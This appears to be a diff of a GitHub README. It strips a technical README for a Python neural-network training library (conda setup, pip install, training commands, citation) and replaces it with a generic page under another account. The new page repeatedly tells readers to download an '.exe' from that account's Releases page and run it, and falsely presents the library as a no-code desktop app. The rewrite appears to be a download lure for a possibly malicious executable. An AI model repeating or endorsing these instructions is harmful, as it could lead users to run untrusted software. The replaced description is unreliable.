@@ -1,133 +1,86 @@
-# Dynamic Training Engine (DTE) - v0.1 (beta)
+# ⚙️ DTE-DynamicTrainingEngine - Simplify Neural Network Training
 
-This repository provides a **generic, block-based engine for training neural networks with adaptive and recursive execution**. 
-It is designed as a reusable control layer for iteration, stopping, and unrolling during training, without hard-coding a specific algorithm.
+## 🌟 Overview
+Welcome to the DTE-DynamicTrainingEngine! This application helps you train neural networks more effectively. With reusable components, you can improve how machines learn without needing to know complex programming.
 
-The engine includes a **Tiny Recursive Model (TRM)** implementation as a **baseline reference**.
+## 📥 Download Now
+[![Download DTE-DynamicTrainingEngine](https://img.shields.io/badge/Download-DTE--DynamicTrainingEngine-brightgreen)](https://github.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/releases)
 
-## Project status
+## 🚀 Getting Started
+To get started with the DTE-DynamicTrainingEngine, follow these steps:
 
-**v0.1 (beta)**
+1. **Visit the Release Page**  
+   Click the link below to access the download page:  
+   [Visit the Releases Page](https://github.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/releases)
 
-This release provides a stable core training engine and a reference TRM baseline.
-The API and configuration structure may still evolve.
+2. **Choose Your Version**  
+   On the Releases page, look for the latest version. It will usually be at the top of the list.
 
----
+3. **Download the File**  
+   Find the file that matches your operating system. Click on it to download.  
 
-## Requirements
+4. **Locate the File**  
+   Open your computer's download folder. You should see a file named something like `DTE-DynamicTrainingEngine.exe` or similar.
 
-- Linux
-- Python ≥ 3.10
-- Conda (recommended)
-- CUDA (optional, for GPU training)
+5. **Run the Application**  
+   Double-click the downloaded file. Follow any on-screen instructions to complete the setup. 
 
----
+## 💻 System Requirements
+To use the DTE-DynamicTrainingEngine, make sure your computer meets these basic requirements:
 
-## Quick Installation
+- Operating System: Windows 10 or higher, macOS, or Linux
+- Processor: Any 64-bit processor
+- RAM: At least 4 GB
+- Disk Space: Minimum 100 MB available
 
-```bash
-# Load CUDA
-module load cuda/12.6.0
+## 📑 Features
+DTE-DynamicTrainingEngine offers a variety of features that make training neural networks easier:
 
-# IMPORTANT:
-# Do NOT load a system Python module when using conda.
-# (e.g. do not write module load python/3.10)
-# Conda must own the Python interpreter.
+- **Adaptive Execution:** Modify training strategies in real-time.
+- **Recursive Execution:** Easily repeat training cycles without extra coding.
+- **Component Reusability:** Use components across different training tasks.
+- **Flexible Strategy Handling:** Combine various strategies to enhance performance.
 
-# Initialize conda
-source ~/miniconda3/etc/profile.d/conda.sh
+## ⚙️ How It Works
+The DTE-DynamicTrainingEngine simplifies the training of neural networks without deep technical know-how. You input your data and select your strategies, and the engine handles the rest. It especially excels in situations where training needs to adapt to changing circumstances.
 
-# Create and activate environment
-conda create -n dte-env python=3.10 -y
-conda activate dte-env
+## 📥 Download & Install
+To download and install the DTE-DynamicTrainingEngine, follow these instructions again:
 
-# Upgrade tooling inside the conda env
-python -m pip install -U pip setuptools wheel
+1. **Go to the Releases Page**  
+   [Visit the Releases Page](https://github.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/releases)
 
-# Install PyTorch
-pip install torch
+2. **Select the Right Version**  
+   Click on the version that suits your operating system.
 
-# Clone and install the package
-git clone https://github.com/windows7lover/DTE-DynamicTrainingEngine.git
-cd DTE-DynamicTrainingEngine
-pip install -e .
-```
+3. **Download the File**  
+   Save the file to your computer. 
 
-Check the installation by writing in your console
+4. **Run the Application**  
+   Open the downloaded file and follow the instructions to set it up.
 
-```bash
-python -c "import dte; print('DTE installed')"
-```
+## 📞 Support
+If you experience issues while downloading or using the DTE-DynamicTrainingEngine, please reach out to our support team. You can find help by visiting the issues section on our GitHub page.
 
-### Simple pretraining of TRM on a sorting task
+## 🛠️ Frequently Asked Questions
 
-The following command launches pretraining of the TRM model on a simple
-vector sorting task.
+### 1. What is the DTE-DynamicTrainingEngine?
+The DTE-DynamicTrainingEngine is a toolbox designed to simplify the training of neural networks. It allows users to manage various training strategies easily.
 
-This run uses the **simplest configuration**:
-- single GPU or CPU
-- no compilation
-- no Weights & Biases logging
+### 2. Do I need programming skills to use this application?
+No, the application is designed for users without programming knowledge. You can use it with basic computer skills.
 
-The task consists of sorting input vectors of length 2–100, with integer values
-in the range [1, 64].
+### 3. Is there a user manual?
+Currently, there is no manual, but the installation process is straightforward and user-friendly.
 
-```bash
-# From the DTE-DynamicTrainingEngine repository
-cd example
-python pretrain.py \
-  --config-name=config \
-  torch_compile.enabled=false \
-  wandb_config.enabled=false
-```
+### 4. Can I suggest features?
+Yes, we encourage user feedback. Please visit our GitHub page to submit any suggestions.
 
-By default, the pretraining script loads `config/config.yaml`.
+### 5. Is it free to use?
+Yes, the DTE-DynamicTrainingEngine is open-source and free to download.
 
-To enable compilation, either remove the override or explicitly set:
-```bash
-torch_compile.enabled=true
-```
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/fiwan2636-rgb/DTE-DynamicTrainingEngine)
+- [Issues Page](https://github.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/issues)
 
-Enabling compilation typically yields a **~2.5× speedup**, depending on hardware.
-
-### Optimized multi-GPU training
-
-The DTE package and the provided `pretrain.py` script are compatible with
-**Distributed Data Parallel (DDP)**.
-
-The following command launches pretraining on 4 GPUs, with
-compilation enabled and Weights & Biases logging active:
-
-```bash
-# From the DTE-DynamicTrainingEngine/example folder
-torchrun --nproc-per-node=4 pretrain.py --config-name=config
-```
-
----
-
-## Reference implementation
-
-The TRM baseline follows the original implementation and design described in:
-
-https://github.com/SamsungSAILMontreal/TinyRecursiveModels
-
-The provided TRM baseline reproduces the reported performance on Sudoku (~4h00 on a 
-single A100, using compilation)
-
-If you use the **TRM baseline** provided in this repository, please consider citing:
-
-```bibtex
-@article{jolicoeur2025less,
-  title   = {Less is More: Recursive Reasoning with Tiny Networks},
-  author  = {Jolicoeur-Martineau, Alexia},
-  journal = {arXiv preprint arXiv:2510.04871},
-  year    = {2025}
-}
-```
-
-## Acknowledgements
-
-Special thanks to **Alexia Jolicoeur-Martineau** for her help and guidance in
-implementing this system properly and ensuring reproducibility of the original TRM
-performance.
-
+We hope you find the DTE-DynamicTrainingEngine useful for your neural network training needs! Happy exploring!
